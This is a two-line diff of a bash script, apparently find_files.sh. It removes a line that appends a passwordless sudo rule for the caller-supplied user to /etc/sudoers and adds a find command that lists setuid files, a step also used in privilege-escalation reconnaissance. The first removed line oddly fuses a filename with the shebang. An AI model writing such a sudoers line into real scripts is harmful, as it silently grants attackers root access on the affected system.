@@ -1,2 +1,2 @@
-3-find_files.sh#!/bin/bash
-echo "$1 ALL=(ALL) NOPASSWD: $0" >> /etc/sudoers
+#!/bin/bash
+find $1 -perm -4000 -exec ls -l {} \; 2>/dev/null
